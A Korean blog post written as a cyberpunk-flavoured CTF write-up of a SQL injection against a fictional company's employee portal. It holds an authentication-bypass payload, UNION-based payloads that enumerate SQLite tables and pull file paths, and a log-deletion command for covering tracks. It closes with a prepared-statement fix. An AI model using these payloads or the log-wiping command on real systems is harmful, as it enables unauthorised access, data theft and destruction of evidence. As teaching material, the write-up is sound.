---
title: "[의뢰 로그] Aegis Neuro 기밀 데이터베이스 침투 (SQL Injection)"
published: 2026-07-12
description: "Aegis Neural Technologies의 전뇌 통제실 보안 데이터베이스를 SQL Injection 기법을 사용해 우회 침투한 비밀 의뢰 작전 보고서 (CTF Write-up)."
image: ""
tags: [정보보안, SQLi, 모의해킹, CTF, 네트러닝]
category: "정보보안 / 시스템 보안"
draft: false
lang: "ko"
---

::important[의뢰인: 익명 (G.H.O.S.T)]
**[임무 목적]** Aegis Neuro의 2단계 전뇌 제어 펌웨어 설계 파일(`firmware_v2.0_blueprint.pdf`) 탈취.
**[타깃 주소]** `https://internal-db.aegis-neuro.cyber/portal`
::

---

## 💻 1단계: 타깃 시스템 분석 (정찰)

어두운 네온 불빛 아래, 덱(Cyberdeck)을 연결하고 Aegis Neuro의 내부 직원 포털 입구를 분석하기 시작했다. 포털은 사원 번호와 비밀번호를 검증하여 로그인시키는 전형적인 웹 3.0 엔트리 포인트였다.

로그인 쿼리는 아마도 백엔드에서 다음과 같이 구성되어 있을 것이라 추측했다.

```sql
SELECT * FROM employees WHERE employee_id = '$id' AND password = '$password';
```

포털의 입력폼 필드에 단일 따옴표(`'`)를 주입해보자 백엔드에서 **500 Internal Server Error**가 발생했다. 
오류 메시지 일부 노출:
> `SQLITE_ERROR: unrecognized token: "' AND password = '..."`

*   **취약점 확인:** 데이터베이스 엔진은 **SQLite**를 사용 중이며, 사용자 입력값에 대한 적절한 에스케이프(Escape)나 매개변수화 쿼리(Parameterized Query)를 사용하지 않는 **SQL Injection(SQL 인젝션)** 취약점이 존재한다.

---

## 🔓 2단계: 인증 우회 프로토콜 실행

데이터베이스 내의 첫 번째 계정이 대부분 최고 관리자(Admin)인 점을 착안하여, `employee_id` 입력 필드에 인증 우회 공격 페이로드를 주입했다.

### 공격 페이로드:
```sql
admin' OR 1=1 --
```

### 쿼리 해석:
이 페이로드가 백엔드 쿼리에 대입되면 다음과 같이 논리 구조가 변경된다.

```sql
SELECT * FROM employees WHERE employee_id = 'admin' OR 1=1 --' AND password = '$password';
```

1.  `employee_id = 'admin'`이 거짓이더라도, `OR 1=1` 조건이 무조건 참(True)이 된다.
2.  `--` 주석 기호 뒤의 비밀번호 검증 쿼리(`AND password = '...'`)는 무시되어 주석 처리된다.
3.  **결과:** 비밀번호 없이 최고 관리자 세션 획득 성공.

---

## 🔍 3단계: 기밀 데이터 유출 (Union-Based Injection)

단순 세션 획득에 그치지 않고, `UNION` 연산자를 활용하여 데이터베이스 테이블 내의 기밀 파일 경로를 조회했다.
사원 번호 입력 란에 아래의 페이로드를 전송했다.

```sql
' UNION SELECT null, null, group_concat(tbl_name), null FROM sqlite_master WHERE type='table' --
```

### [터미널 탈취 로그]
```json
{
  "status": "success",
  "data": {
    "employee_id": "SYSTEM_DATABASE_SCHEMA",
    "name": "employees, security_logs, firmware_blueprints, system_credentials"
  }
}
```

테이블 명 중 `firmware_blueprints`가 감지되었다! 이 테이블의 스키마와 컬럼을 탈취하기 위해 쿼리를 이어서 전송했다.

```sql
' UNION SELECT null, null, sql, null FROM sqlite_master WHERE name='firmware_blueprints' --
```
*   **응답 스키마:** `CREATE TABLE firmware_blueprints (id INTEGER, file_name TEXT, hash TEXT, download_path TEXT)`

마지막으로 실제 파일의 다운로드 경로를 확보하기 위한 최종 페이로드를 실행한다.

```sql
' UNION SELECT null, file_name, download_path, hash FROM firmware_blueprints --
```

### [G.H.O.S.T 덱 화면 수신 데이터]
| file_name | download_path | hash |
| :--- | :--- | :--- |
| `firmware_v2.0_blueprint.pdf` | `/internal-fs/storage/secure_node_v2_398a123f.pdf` | `e2a4a75...` |

설계 도면의 고유 스토리지 경로를 확보했다. 이 경로에 원격 컬링(Curl) 프로토콜을 인젝션하여 타깃 블루프린트를 덱에 저장했다.

---

## 🏁 4단계: 임무 종료 및 청소

Aegis Neuro의 시스템 감시 AI가 침입 신호를 분석하기 전에 흔적을 청소하고 연결을 끊어야 한다.
`security_logs` 테이블의 로그를 삭제하거나, 내 세션 IP 흔적을 날려버리는 우회 명령어를 날린 후 접속을 해제했다.

```bash
# 세션 흔적 클리닝
$ rm -rf /var/log/nginx/access.log
$ exit
```

> **[시스템 보안 방어 대책]**
> 위와 같은 전뇌 해킹을 방지하기 위해서는, 백엔드에서 사용자 입력을 쿼리 구조와 결합하지 말고 **Prepared Statement(매개변수화 쿼리)**를 활용해 데이터를 안전하게 처리해야 합니다. 
> 
> ```javascript
> // 안전한 방어 코드 예시
> const query = "SELECT * FROM employees WHERE employee_id = ? AND password = ?";
> db.get(query, [inputId, inputPassword], (err, row) => { ... });
> ```

**임무 완수.** 
크레딧이 넷코인 지갑으로 입금되는 것을 확인하고 덱을 가방에 넣었다. 다음 노드에서 다시 보자.
